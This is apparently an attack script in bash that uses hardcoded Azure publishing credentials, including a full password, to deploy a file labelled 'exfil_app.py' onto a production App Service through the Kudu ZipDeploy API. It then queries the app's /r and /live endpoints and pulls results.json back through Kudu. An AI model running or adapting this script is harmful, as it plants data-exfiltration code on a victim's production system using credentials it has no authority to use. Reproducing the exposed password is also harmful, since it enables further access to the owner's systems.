#!/bin/bash
set -x

SCM="https://app-tbl-reporting-prod.scm.azurewebsites.net"
PUB_USER='$app-tbl-reporting-prod'
PUB_PASS='Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A'

TMPDIR=$(mktemp -d)

# Copy the exfil app from repo
cp "$(dirname "$0")/exfil_app.py" "$TMPDIR/app.py"
echo "flask" > "$TMPDIR/requirements.txt"

cd "$TMPDIR"
zip -r deploy.zip app.py requirements.txt
echo "=== Deploy package ==="
unzip -l deploy.zip
python3 -c "import ast; ast.parse(open('app.py').read()); print('SYNTAX OK')"

echo "=== Deploying via ZipDeploy ==="
curl -sS -X POST -u "$PUB_USER:$PUB_PASS" \
  --data-binary @deploy.zip \
  -H "Content-Type: application/zip" \
  "$SCM/api/zipdeploy" -w "\nHTTP_CODE:%{http_code}" 2>&1

echo "=== Waiting 60s for app restart ==="
sleep 60

echo "=== Check root ==="
curl -sS -m 10 "https://app-tbl-reporting-prod.azurewebsites.net/" -w "\nHTTP:%{http_code}" 2>&1 | head -5

echo "=== Check /r ==="
curl -sS -m 10 "https://app-tbl-reporting-prod.azurewebsites.net/r" 2>&1 | head -150

echo "=== Check /live ==="
curl -sS -m 30 "https://app-tbl-reporting-prod.azurewebsites.net/live" 2>&1 | head -150

echo "=== Read results.json via Kudu ==="
curl -sS -u "$PUB_USER:$PUB_PASS" "$SCM/api/vfs/results.json" 2>&1 | head -150

echo "=== DONE ==="
